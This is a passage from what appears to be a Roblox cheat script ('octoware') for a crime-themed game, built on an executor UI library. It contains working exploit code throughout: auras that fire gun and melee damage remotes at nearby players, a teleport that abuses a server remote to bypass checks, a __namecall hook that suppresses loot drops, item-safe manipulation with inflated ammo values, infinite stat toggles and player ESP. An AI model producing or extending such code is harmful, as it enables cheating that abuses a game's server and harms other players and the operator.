                local dis = (p.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude
                
                if dis <= 30 and plr.Character.Humanoid.Health > 0 then
                    local visualise = {[1] = Vector3.new(plr.Character.Head.Position), [2] = tool, [3] = Vector3.new(plr.Character.Head.Position), [4] = true}
                    local impact = {
                        [1] = tool,
                        [2] = plr.Character.Head,
                        [3] = Vector3.new(plr.Character.Head.Position),
                        [4] = Vector3.new(plr.Character.Head.Position),
                        [5] = Vector3.new(plr.Character.Head.Position),
                        [6] = "PART",
                        [7] = {
                            [1] = workspace:WaitForChild("Camera"),
                            [2] = workspace:WaitForChild(p.Name),
                            [3] = workspace:WaitForChild("apes"),
                            [4] = workspace:WaitForChild("OBJECTS")
                        }
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Visualize"):FireServer(unpack(visualise))
                    game:GetService("ReplicatedStorage"):WaitForChild("GunRemotes"):WaitForChild("Impact"):FireServer(unpack(impact))
                end
            end
        end
        task.wait()
    end
end

LocalPlayerBox:AddToggle('gaura', {
    Text = 'Gun Aura',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        for _, t in pairs(p.Character:GetChildren()) do
            if t:FindFirstChild("Stats") then
                tool = t
            else
                for _, bt in pairs(p.Backpack:GetChildren()) do
                    if bt:FindFirstChild("Stats") then
                        tool = bt
                        p.Character.Humanoid:EquipTool(tool)
                    end
                end
            end
        end
        shared.gunAura = v
        if v then
            startGunAura() -- Start the gun aura loop if toggled on
        end
    end
})        

faf:AddKeyPicker('TriggerBotBind', {
    -- SyncToggleState only works with toggles.
    -- It allows you to make a keybind which has its state synced with its parent toggle
    -- Example: Keybind which you use to toggle flyhack, etc.
    -- Changing the toggle disables the keybind state and toggling the keybind switches the toggle state
    Default = 'V', -- String as the name of the keybind (MB1, MB2 for mouse buttons)
    SyncToggleState = false,
    -- You can define custom Modes but I have never had a use for it.
    Mode = 'Hold', -- Modes: Always, Toggle, Hold
    Text = '', -- Text to display in the keybind menu
    NoUI = false, -- Set to true if you want to hide from the Keybind menu,
    -- Occurs when the keybind is clicked, Value is `true`/`false`
    Callback = function()
    end,
    -- Occurs when the keybind itself is changed, `New` is a KeyCode Enum OR a UserInputType Enum
    ChangedCallback = function(New)
        keybind = New
    end
})

local InstaMeleeActive = false

LocalPlayerBox:AddToggle('InstaMelee', {
    Text = 'Melee Aura',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        InstaMeleeActive = v
        
        -- Function to handle the melee aura logic
        local function MeleeAura()
            while InstaMeleeActive do
                for _, p in pairs(game.Players:GetPlayers()) do
                    if InstaMeleeActive and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and p ~= game.Players.LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                        local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - p.Character.HumanoidRootPart.Position).Magnitude
                        if distance <= 15 then
                            local zero = {
                                [1] = p.Character.Humanoid,
                                [3] = 0,
                                [4] = p.Character.HumanoidRootPart,
                                [5] = "Front"
                            }
                            local one = {
                                [1] = p.Character.Humanoid,
                                [3] = 0,
                                [4] = p.Character.HumanoidRootPart,
                                [5] = "Front"
                            }
                            local args = {
                                [1] = 1
                            }
                            
                            for _, t in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                                if t:FindFirstChild("BackstabDamage") then
                                    return
                                else
                                    for _, t in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                        if t:FindFirstChild("BackstabDamage") then
                                            game.Players.LocalPlayer.Character.Humanoid:EquipTool(t)
                                            repeat
                                                game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = p.Character.HumanoidRootPart.CFrame
                                                t.LocalScript.Sw:FireServer(unpack(args))
                                                t.LocalScript.Damage:FireServer(unpack(zero))
                                                t.LocalScript.Damage:FireServer(unpack(one))
                                                
                                                task.wait()
                                            until not InstaMeleeActive or p.Character.Humanoid.Health <= 0
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait()
            end
        end
        
        if v then
            task.spawn(MeleeAura)
        end
    end
})

LocalPlayerBox:AddToggle('MeleeKill', {
    Text = 'Fast Melee',
    Default = false, -- Default value (true / false)
})

LocalPlayerBox:AddToggle('PushKill', {
    Text = 'Push Aura',
    Default = false, -- Default value (true / false)
})

local jab = {
    [1] = "SwingBegin",
    [2] = {
        [1] = "Hook"
    }
}

local push = {
    [1] = "Push"
}

LocalPlayerBox:AddToggle('FistKil', {
    Text = 'Fist Aura',
    Default = false, -- Default value (true / false)
})

if getexecutorname() == "Synapse Z" or getexecutorname() == "Wave" then
    local antiloot = false
    local oldK; oldK = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        args = {...}
        if antiloot and tostring(self) == "EDead" and args[2] == "CreateLoot" then
            return
        end
        
        return oldK(self, ...)
    end))

    LocalPlayerBox:AddToggle('aloot', {
        Text = 'Anti-Loot',
        Default = false, -- Default value (true / false)
        Callback = function(v)
            antiloot = v
        end
    })
end

LocalPlayerBox:AddToggle('Anti-Cuff', {
    Text = 'Anti-Cuff',
    Default = false, -- Default value (true / false)
})

LocalPlayerBox:AddToggle('Auto-Pick', {
    Text = 'Auto Pick Up',
    Default = false, -- Default value (true / false)
})        


LocalPlayerBox:AddToggle('Inf-Skittles', {
    Text = 'Infinite Skittles',
    Default = false, -- Default value (true / false)
})

LocalPlayerBox:AddToggle('InfStamina', {
    Text = 'Infinite Stamina',
    Default = false, -- Default value (true / false)
})

LocalPlayerBox:AddToggle('Inf-Karma', {
    Text = 'Infinite Karma',
    Default = false, -- Default value (true / false)
})

local kModule = game.Players.LocalPlayer:FindFirstChild("Valuestats"):FindFirstChild("Karma")

kModule.Changed:Connect(function(c)
    if Toggles["Inf-Karma"] and c < kModule.Value then
        kModule.Value = 9e9
    end
end)


local SlotsToggle = false;
LocalPlayer:WaitForChild("PlayerGui").ChildAdded:Connect(function(v)
    if v.Name == "Safe" then
        v.Frame.Badge.Value = SlotsToggle
    end
end) 

LocalPlayerBox:AddToggle('SafeSlots', {
    Text = '10 Safe Slots',
    Default = false, -- Default value (true / false)
})

LocalPlayerBox:AddButton('Respawn When Dead', function()
    if tpM3Ready == true then
        game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("MenuTP"):FireServer("End")
    end
end)

ExtraPlayerBox:AddSlider('WS', {
    Text = 'WalkSpeed',
    Default = 6,
    Min = 1,
    Max = 35,
    Rounding = 0,
    Compact = true,
    Callback = function(v)
        if game.Players.LocalPlayer.Character then
            if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
            end
        end
    end
})

ExtraPlayerBox:AddSlider('JP', {
    Text = 'JumpPower',
    Default = 0,
    Min = 0,
    Max = 500,
    Rounding = 0,
    Compact = true,
    Callback = function(v)
        if game.Players.LocalPlayer.Character then
            if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
                game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
            end
        end
    end
})

ExtraPlayerBox:AddToggle('IJ', {
    Text = 'Infinite Jump',
    Default = false,
    Callback = function(v)
        local player = game.Players.LocalPlayer
        local userInputService = game:GetService("UserInputService")
        local connection

        local function onJumpRequest()
            if v then
                player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end

        if v then
            connection = userInputService.JumpRequest:Connect(onJumpRequest)
        else
            if connection then
                connection:Disconnect()
            end
        end
    end
})

ExtraPlayerBox:AddToggle('CCT', {
    Text = 'Control + Click Teleport',
    Default = false,
    Callback = function(v)
        local LocalPlayer = game.Players.LocalPlayer
        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart")

        local UIS = game:GetService("UserInputService")
        local Mouse = LocalPlayer:GetMouse()

        local BypassArguments = {"Start", "End"}
        local BypassHandler = game.ReplicatedStorage.UI.MenuTP

        function Teleport(pos)
            if v ~= true then return end
            if Character then
                HumanoidRootPart.Anchored = true
                BypassHandler:FireServer(BypassArguments[2])
                task.wait(0.1)
                HumanoidRootPart.Anchored = false
                Character:MoveTo(pos)
            end
        end

        UIS.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) and v ~= false then
                Teleport(Mouse.Hit.p)
            end
        end)
    end
})

ExtraPlayerBox:AddSlider('TOD', {
    Text = 'Time of Day',
    Default = 12,
    Min = 1,
    Max = 24,
    Rounding = 0,
    Compact = true,
    Callback = function(v)
        local isR = false

        game.Players.LocalPlayer.CharacterAdded:Connect(function()
            isR = true
        end)

        while isR ~= true do
            game.Lighting.ClockTime = v
            task.wait()
        end
    end
})

ExtraPlayerBox:AddSlider('MXZ', {
    Text = 'Zoom',
    Default = game.Players.LocalPlayer.CameraMaxZoomDistance,
    Min = 0,
    Max = 500,
    Rounding = 0,
    Compact = true,
    Callback = function(v)
        game.Players.LocalPlayer.CameraMaxZoomDistance = v
    end
})



ExtraPlayerBox:AddToggle('Anti Apartment', {
    Text = 'Anti Apartment Check',
    Default = false, -- Default value (true / false)
})


local HoodNo,oldhood;
ExtraPlayerBox:AddToggle('Hood', {
    Text = 'Anti Hood Pull',
    Default = false, -- Default value (true / false)
})



ExtraPlayerBox:AddToggle('Camerabob', {
    Text = 'Anti Camera Bob',
    Default = false, -- Default value (true / false)
})

ExtraPlayerBox:AddToggle('AntiRag', {
    Text = 'Anti Ragdoll',
    Default = false, -- Default value (true / false)
})



local RealCrash = ReplicatedStorage["AirbagSystem"]
local FakeCrash = Instance.new("RemoteEvent",ReplicatedStorage.GunRemotes)
FakeCrash.Name = "AirbagSystem"
ExtraPlayerBox:AddToggle('Anti Crash', {
    Text = 'Anti Crash',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        if v then
            RealCrash.Parent = ReplicatedStorage.GunRemotes
            FakeCrash.Parent = ReplicatedStorage
        else
            FakeCrash.Parent = ReplicatedStorage.GunRemotes
            RealCrash.Parent = ReplicatedStorage
        end
    end
})


ExtraPlayerBox:AddToggle('Safe Mode', {
    Text = 'Safe Mode',
    Default = false, -- Default value (true / false)
    Callback = function(x) SafeToggled = x end
})

SafeRemote = game.ReplicatedStorage.UI.Safe
SafeStats = game.Players.LocalPlayer.SafeStats
local BlacklistedTools = {
    ['Skittles'] = true,
    ['SkittlesPack'] = true,
    ['Bally'] = true,
    ['Mask'] = true,
    ['Fist'] = true,
    ['Phone'] = true,
    ['MXHelmet'] = true,
    ['SBGlock'] = true,
    ['Radio'] = true,
    ['SBDraco'] = true,
    ['AK'] = true,
    ['Airpods'] = true,
    ['Bandana'] = true
}


SafeBox:AddToggle('SafeGunsDead', {
    Text = 'Safe Guns When You Die',
    Default = false,
})


SafeBox:AddToggle('MxClips', {
    Text = 'Max Clips/Uses On Item',
    Default = false,
})


function GetItemFromSafe(Name)
    for i,v in pairs(SafeStats:GetChildren()) do
        if v.Value == Name then
            return v
        end
    end
end

local ChosenPlayer = game.Players.LocalPlayer.UserId

SafeBox:AddDropdown('SafeDropDown', {
    Values = {},
    Default = '', -- number index of the value / string
    Multi = false, -- true / false, allows multiple choices to be selected
    AllowNull = true,
    Text = 'Take Gun',
    Callback = function(Val)
        SafeRemote:FireServer("Takeout",GetItemFromSafe(Val).Value,GetItemFromSafe(Val):FindFirstChildOfClass("IntValue").Value,ChosenPlayer)
    end
})

SafeBox:AddDropdown('PuttingDropDown', {
    Values = {},
    Default = '', -- number index of the value / string
    Multi = false, -- true / false, allows multiple choices to be selected
    AllowNull = true,
    Text = 'Safe Gun',
    Callback = function(v)
        if Toggles['MxClips'].Value == false then
            if game.Players.LocalPlayer.Backpack[v]:FindFirstChild("Stats") then
                SafeRemote:FireServer("Movetosafe",v,game.Players.LocalPlayer.Backpack[v].Stats.MaxAmmo.Value,ChosenPlayer)
            elseif game.Players.LocalPlayer.Backpack[v]:FindFirstChild("USES") then
                SafeRemote:FireServer("Movetosafe",v,game.Players.LocalPlayer.Backpack[v].USES.Value,ChosenPlayer)
            elseif game.Players.LocalPlayer.Backpack[v]:FindFirstChild("val") then
                SafeRemote:FireServer("Movetosafe",v,game.Players.LocalPlayer.Backpack[v].val.Value,ChosenPlayer)
            else
                SafeRemote:FireServer("Movetosafe",v,999999999999999999,ChosenPlayer)
            end
        elseif Toggles['MxClips'].Value == true then
            SafeRemote:FireServer("Movetosafe",v,999999999999999999,ChosenPlayer)
        end  
    end
})

SafeBox:AddDropdown('TheWLThing', {
    SpecialType = 'Player',
    Text = 'Player To Whitelist',
    Multi = false,
    Callback = function(Value)
        ChosenPlayer = game.Players[Value].UserId
    end
})

SafeBox:AddButton('Safe Checker', function() 
    for _, p in pairs(game.Players:GetPlayers()) do
        if p ~= game.Players.LocalPlayer and p:FindFirstChild("SafeStats") then
            local gunCounts = {}
            
            for _, t in pairs(p.SafeStats:GetChildren()) do
                if t.ClassName == "StringValue" and t.Value ~= "nil" then
                    gunCounts[t.Value] = (gunCounts[t.Value] or 0) + 1
                end
            end
            
            local formattedGuns = {}
            for gunName, count in pairs(gunCounts) do
                if count > 1 then
                    table.insert(formattedGuns, gunName .. " [" .. count .. "x]")
                else
                    table.insert(formattedGuns, gunName)
                end
            end
            
            if #formattedGuns > 0 then
                print(p.Name .. " Has: " .. table.concat(formattedGuns, ", "))
                print("--------------------------------------------------")
            end
        end
    end            
end)

local Players = game:GetService("Players")
local COREGUI = game:GetService("CoreGui")
local LP = Players.LocalPlayer

local HighlightESPenabled = false
local TextESPenabled = false
local WeaponESPEnabled = false

-- Function to create highlight ESP
local function CreateHighlightESP(plr)
    if plr ~= LP and plr.Character and not plr.Character:FindFirstChild("Highlight") then
        local highlight = Instance.new("Highlight", plr.Character)
        highlight.FillColor = Color3.fromRGB(0, 225, 0)
    end
end

-- Function to remove highlight ESP
local function RemoveHighlightESP(plr)
    if plr.Character then
        local highlight = plr.Character:FindFirstChild("Highlight")
        if highlight then
            highlight:Destroy()
        end
    end
end

-- Function to update the text label with name (without distance)
local function UpdateTextLabel(plr, label)
    if label and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        label.Text = plr.Name .. ' | ' .. plr.DisplayName
    end
end

-- Function to create text ESP
local function CreateTextESP(plr)
    if plr.Character and plr.Name ~= LP.Name and not COREGUI:FindFirstChild(plr.Name..'_TextESP') then
        local ESPholder = Instance.new("Folder")
        ESPholder.Name = plr.Name..'_TextESP'
        ESPholder.Parent = COREGUI

        if plr.Character:FindFirstChild('Head') then
            local BillboardGui = Instance.new("BillboardGui")
            local TextLabel = Instance.new("TextLabel")

            BillboardGui.Adornee = plr.Character.Head
            BillboardGui.Name = plr.Name
            BillboardGui.Parent = ESPholder
            BillboardGui.Size = UDim2.new(0, 100, 0, 150)
            BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
            BillboardGui.AlwaysOnTop = true

            TextLabel.Parent = BillboardGui
            TextLabel.BackgroundTransparency = 1
            TextLabel.Position = UDim2.new(0, 0, 0, -50)
            TextLabel.Size = UDim2.new(0, 100, 0, 100)
            TextLabel.Font = Enum.Font.SourceSansSemibold
            TextLabel.TextSize = 17
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextStrokeTransparency = 0.3
            TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom

            UpdateTextLabel(plr, TextLabel)
        end
    end
end

-- Function to remove text ESP
local function RemoveTextESP(plr)
    local holder = COREGUI:FindFirstChild(plr.Name..'_TextESP')
    if holder then
        holder:Destroy()
    end
end

-- Toggle functions
local function ToggleHighlightESP(state)
    HighlightESPenabled = state
    for _, plr in pairs(Players:GetPlayers()) do
        if HighlightESPenabled then
            CreateHighlightESP(plr)
        else
            RemoveHighlightESP(plr)
        end
    end
end

local function ToggleTextESP(state)
    TextESPenabled = state
    for _, plr in pairs(Players:GetPlayers()) do
        if TextESPenabled then
            CreateTextESP(plr)
        else
            RemoveTextESP(plr)
        end
    end
end

Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function()
        task.wait(2)
        if HighlightESPenabled then
            CreateHighlightESP(plr)
        end
        if TextESPenabled then
            CreateTextESP(plr)
        end
    end)
end)

for _, plr in pairs(Players:GetPlayers()) do
    if HighlightESPenabled then
        CreateHighlightESP(plr)
    end
    if TextESPenabled then
        CreateTextESP(plr)
    end
    plr.CharacterAdded:Connect(function()
        task.wait(2)
        if HighlightESPenabled then
            CreateHighlightESP(plr)
        end
        if TextESPenabled then
            CreateTextESP(plr)
        end
    end)
end

local ESPBox = Tabs.Visuals:AddLeftGroupbox('ESP Options')

ESPBox:AddToggle('HighlightESPEnabled', {
    Text = 'Enable ESP',
    Default = false, 
    Callback = function(v)
        ToggleHighlightESP(v)
    end
})
ESPBox:AddToggle('TextESPEnabled', {
    Text = 'Name ESP',
    Default = false, 
    Callback = function(v)
        ToggleTextESP(v)
    end
})
local function CreateWeaponESP(player, tool)
    if not WeaponESPenabled then return end
    
    local ESPholder = Instance.new("Folder")
    ESPholder.Name = player.Name .. '_WeaponESP_' .. tool.Name
    ESPholder.Parent = COREGUI

    local BillboardGui = Instance.new("BillboardGui")
    local TextLabel = Instance.new("TextLabel")

    BillboardGui.Adornee = tool
    BillboardGui.Name = tool.Name .. "_ESP"
    BillboardGui.Parent = ESPholder
    BillboardGui.Size = UDim2.new(0, 100, 0, 50)
    BillboardGui.StudsOffset = Vector3.new(0, 3, 0) 
    BillboardGui.AlwaysOnTop = true

    TextLabel.Parent = BillboardGui
    TextLabel.BackgroundTransparency = 1
    TextLabel.Size = UDim2.new(0, 100, 0, 50)
    TextLabel.Font = Enum.Font.SourceSansSemibold
    TextLabel.TextSize = 17
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextStrokeTransparency = 0.3
    TextLabel.TextYAlignment = Enum.TextYAlignment.Center
    TextLabel.Text = tool.Name
end

local function RemoveWeaponESP(player, tool)
    local holder = COREGUI:FindFirstChild(player.Name .. '_WeaponESP_' .. tool.Name)
    if holder then
        holder:Destroy()
    end
end

local function HandleWeaponESP(player)
    local function onChildAdded(newtool)
        if newtool:IsA("Tool") and newtool:FindFirstChild("Stats") or newtool:FindFirstChild("BackstabDamage") then
            CreateWeaponESP(player, newtool)
        end
    end

    for _, tool in pairs(player.Character:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("Stats") or tool:FindFirstChild("BackstabDamage") then
            CreateWeaponESP(player, tool)
        end
    end

    player.Character.ChildAdded:Connect(onChildAdded)

    player.Character.ChildRemoved:Connect(function(removedTool)
        if removedTool:IsA("Tool") and removedTool:FindFirstChild("Stats") or removedTool:FindFirstChild("BackstabDamage") then
            RemoveWeaponESP(player, removedTool)
        end
    end)
end

-- Toggle function to enable/disable Weapon ESP
function ToggleWeaponESP(state)
    WeaponESPenabled = state
    if WeaponESPenabled then
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LP and player.Character then
                HandleWeaponESP(player)
            end
        end
    else
        -- Remove all existing weapon ESPs
        for _, player in pairs(Players:GetPlayers()) do
            for _, tool in pairs(player.Character:GetChildren()) do
                if tool:IsA("Tool") and tool:FindFirstChild("Stats") then
                    RemoveWeaponESP(player, tool)
                end
            end
        end
    end
end

-- Apply the ESP to all players except the local player when the toggle is enabled
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        task.wait(2) -- Wait for the character to fully load
        if WeaponESPenabled then
            HandleWeaponESP(player)
        end
    end)
end)

-- Admin panel toggle for Weapon ESP
ESPBox:AddToggle('weapon', {
    Text = 'Weapon ESP',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        ToggleWeaponESP(v)
    end
})

local EspSettings = Tabs.Visuals:AddLeftGroupbox('ESP Settings')

local Fonts = {}
if getexecutorname() == "Synapse Z" then
    Fonts = {"0","1","2","3","4"}
elseif getexecutorname() == "Wave" then
    Fonts = {"1","2","3","4"}
end

EspSettings:AddButton('Anti Roleplay-Name', function()
    while task.wait(3) do 
        for _, __ in pairs(game.Players:GetPlayers()) do
            if __.Character and __.Character:FindFirstChild("Head") then
                if __.Name ~= game.Players.LocalPlayer.Name then
                    if __.Character.Head:FindFirstChild("Gui"):FindFirstChild("MainFrame") then
                        __.Character.Head:FindFirstChild("Gui"):FindFirstChild("MainFrame"):FindFirstChild("NameLabel").Text = tostring(__)
                    end
                end
            end
        end
    end
end)

local EspColors = Tabs.Visuals:AddRightGroupbox('ESP Colors')

EspColors:AddLabel('Highlight Colour'):AddColorPicker('HighlightClr', {
    Default = Color3.new(1, 1, 1),
    Title = 'Color',
    Transparency = 0,
    Callback = function(color)
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local hESP = player.Character:FindFirstChild("Highlight")
                if hESP then
                    hESP.FillColor = color
                end
            end
        end
    end
})

EspColors:AddLabel('Name ESP Colour'):AddColorPicker('NameClr', {
    Default = Color3.new(1, 1, 1),
    Title = 'Color',
    Transparency = 0,
    Callback = function(color)
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local textESP = game.CoreGui:FindFirstChild(player.Name .. "_TextESP")
                if textESP then
                    local playerLabel = textESP:FindFirstChild(player.Name)
                    if playerLabel then
                        local textLabel = playerLabel:FindFirstChild("TextLabel")
                        if textLabel then
                            textLabel.TextColor3 = color
                        end
                    end
                end
            end
        end
    end
})


local WorldColors = Tabs.Visuals:AddRightGroupbox('World') -- these are your groupboxes better known as "sections"

WorldColors:AddToggle('BLACKJAMAICAN', {
    Text = 'Graphics Mod',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        if v then
            game.Lighting.ColorCorrection.Saturation = 1.3
        else
            game.Lighting.ColorCorrection.Saturation = 0
        end
    end
})

WorldColors:AddLabel('Saturation')

WorldColors:AddToggle('AmbientColor', {
    Text = 'Ambient Color',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        octoware.visuals.world.changeambient = v
    end
})
WorldColors:AddLabel('Color'):AddColorPicker('AmbientClr', {
    Default = Color3.new(1, 1, 1), -- Bright green
    Title = 'Color', -- Optional. Allows you to have a custom color picker title (when you open it)
    Transparency = 0, -- Optional. Enables transparency changing for this color picker (leave as nil to disable)
    Callback = function(v)
        octoware.visuals.world.ambient = v
    end
})
WorldColors:AddToggle('FogColor', {
    Text = 'Fog Color',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        octoware.visuals.world.changefogcolor = v
    end
})
WorldColors:AddLabel('Color'):AddColorPicker('FogClr', {
    Default = Color3.new(1, 1, 1), -- Bright green
    Title = 'Color', -- Optional. Allows you to have a custom color picker title (when you open it)
    Transparency = 0, -- Optional. Enables transparency changing for this color picker (leave as nil to disable)
    Callback = function(v)
        octoware.visuals.world.fogcolor = v
    end
})
WorldColors:AddToggle('FOVtoggle', {
    Text = 'FOV',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        octoware.visuals.world.changefov = v
    end
})
WorldColors:AddSlider('fovval', {
    Text = 'Value',
    Default = 70,
    Min = 0,
    Max = 120,
    Rounding = 0,
    Compact = false,
    Callback = function(v)
        octoware.visuals.world.fov = v
    end
})


local ClientCosmetics = Tabs.Visuals:AddLeftGroupbox("Client Cosmetics") do

    local CrossChainButton = ClientCosmetics:AddButton('Cross Chain', function()
        for i = 1, 2 do
            game.Players.LocalPlayer.Character.Parent = game.ReplicatedStorage
            game.Players.LocalPlayer.Character.Parent = game.Workspace
            game.ReplicatedStorage.Chains.CrossChain:Clone().Parent = game.Players.LocalPlayer.Character
        end
    end)

    CrossChainButton:AddButton('Hunnid Chain', function()
        for i=1, 2 do
            game.Players.LocalPlayer.Character.Parent = game.ReplicatedStorage
            game.Players.LocalPlayer.Character.Parent = game.Workspace
            game.ReplicatedStorage.Chains.HunnidChain:Clone().Parent = game.Players.LocalPlayer.Character
        end
    end)


    ClientCosmetics:AddInput('NameInput', {
        Default = '',
        Numeric = false, -- true / false, only allows numbers
        Finished = false, -- true / false, only calls callback when you press enter
    
        Text = 'Custom Name',

        Placeholder = 'Custom Name Here', -- placeholder text when the box is empty
        -- MaxLength is also an option which is the max length of the text
    })

    Options.NameInput:OnChanged(function()
        v = Options.NameInput.Value
        if tostring(v) ~= "nil" and tostring(v) ~= "" then
            localplayer.Character.Head.Gui.MainFrame.NameLabel.Text = tostring(v)
        end
    end)

    ClientCosmetics:AddInput('LevelInput', {
        Default = '',
        Numeric = false, -- true / false, only allows numbers
        Finished = false, -- true / false, only calls callback when you press enter
    
        Text = 'Custom Level',

        Placeholder = 'Custom Level Here', -- placeholder text when the box is empty
    })

    Options.LevelInput:OnChanged(function()
        v = Options.LevelInput.Value
        if tostring(v) ~= "" then
            LocalPlayer.Character.Head.Gui.MainFrame.Age.Text = "Level : "..v
        end
    end)

    ClientCosmetics:AddDropdown('ShirtDropDown', {
        Values = GetChildrenString(game["ReplicatedStorage"].ShirtsB),
        Default = '', -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
        AllowNull = true,
        Text = 'Custom Shirt',
    })

    ClientCosmetics:AddDropdown('PantsDropDown', {
        Values = GetChildrenString(game["ReplicatedStorage"].PantsB),
        Default = '', -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
        AllowNull = true,
        Text = 'Custom Pants',
    })
end


Options.ShirtDropDown:OnChanged(function()
    v = tostring(Options.ShirtDropDown.Value)
    if tostring(v) ~= "false" then
        localplayer.Character:FindFirstChildOfClass("Shirt").ShirtTemplate = game["ReplicatedStorage"].ShirtsB[v].ShirtTemplate
    end
end)

Options.PantsDropDown:OnChanged(function()
    v = tostring(Options.PantsDropDown.Value)
    if tostring(v) ~= "false" then
        localplayer.Character:FindFirstChildOfClass("Pants").PantsTemplate = game["ReplicatedStorage"].PantsB[v].PantsTemplate
    end
end)

Toggles["ws234e"]:OnChanged(function()
    OldRadio = Toggles["ws234e"].Value
    while OldRadio do task.wait(.1) 
        game:GetService("ReplicatedStorage"):WaitForChild("Radio"):WaitForChild("send"):FireServer(tostring(Options.MetInput.Value))
    end
end)

Toggles.InfStamina:OnChanged(function()
    local Stamina = LocalPlayer.Valuestats.Stamina
    StaminaToggle = Toggles.InfStamina.Value
    if StaminaToggle then
        Stamina.Value = 999999999999
    else
        Stamina.Value = 100
    end
end)

Options.TheWLThing:SetValue(tostring(LocalPlayer))
function ReturnSafeStats()
    Safe = {}
    for i,v in next, game.Players.LocalPlayer.SafeStats:GetChildren() do
        table.insert(Safe,v.Value)
    end
    table.sort(Safe,function(a,b) return a<b end)
    Options.SafeDropDown:SetValues(Safe)
end
ReturnSafeStats()
for i,v in pairs(game.Players.LocalPlayer.SafeStats:GetChildren()) do
    v:GetPropertyChangedSignal("Value"):Connect(ReturnSafeStats)
end
function ReturnBackpack()
    Backpack = {}
    for i,v in next, game.Players.LocalPlayer.Backpack:GetChildren() do
        if v.Name ~= 'Fist' and v.Name ~= 'Phone' and v:IsA("Tool") then
            table.insert(Backpack,v.Name)
        end
    end
    table.sort(Backpack,function(a,b) return a<b end)
    Options.PuttingDropDown:SetValues(Backpack);
end
ReturnBackpack()
LocalPlayer.Backpack.ChildAdded:Connect(ReturnBackpack)
LocalPlayer.Backpack.ChildRemoved:Connect(ReturnBackpack)
LocalPlayer.CharacterAdded:Connect(function()
    ReturnBackpack()
    LocalPlayer.Backpack.ChildAdded:Connect(ReturnBackpack)
    LocalPlayer.Backpack.ChildRemoved:Connect(ReturnBackpack)
end)

-- you can remove things you dont want
local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
-- I set NoUI so it does not show up in the keybinds menu
MenuGroup:AddButton('Unload', function() Library:Unload() end)
MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' })
ThemeManager:SetLibrary(Library)
ThemeManager:SetFolder('octoware')
ThemeManager:ApplyToTab(Tabs['UI Settings']) -- if you gonna change UI Settings in the tabs you need to replace this as well for themes
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
SaveManager:SetFolder('octoware/games/'..game.PlaceId)
SaveManager:BuildConfigSection(Tabs['UI Settings'])
SaveManager:LoadAutoloadConfig()

if getexecutorname() ~= "Solara" then
    local aimbotfov = utility:draw("Circle", {Visible = false, Color = Color3.new(1, 1, 1), Radius = 100, NumSides = 100, ZIndex = 2, Thickness = 2})
    local aimbotfovoutline = utility:draw("Circle", {Visible = false, Color = Color3.new(0, 0, 0), Radius = 100, NumSides = 100, Thickness = 3})
    local aimbotsnapline = utility:draw("Line", {Visible = false, Color = Color3.new(1, 1, 1), ZIndex = 2})
    local aimbotsnaplineoutline = utility:draw("Line", {Visible = false, Color = Color3.new(0, 0, 0), Thickness = 3})
    local silentfov = utility:draw("Circle", {Visible = false, Color = Color3.new(1, 1, 1), Radius = 100, NumSides = 100, ZIndex = 2, Thickness = 2})
    local silentfovoutline = utility:draw("Circle", {Visible = false, Color = Color3.new(0, 0, 0), Radius = 100, NumSides = 100, Thickness = 3})
    local silentsnapline = utility:draw("Line", {Visible = false, Color = Color3.new(1, 1, 1), ZIndex = 2})
    local silentsnaplineoutline = utility:draw("Line", {Visible = false, Color = Color3.new(0, 0, 0), Thickness = 3})
end

local setfog, setfov = false, false
local defambient = game.Lighting.Ambient
local deffogcolor = game.Lighting.FogColor
local tint = Instance.new("ColorCorrectionEffect", game.Lighting)
runservice["RenderStepped"]:Connect(function()
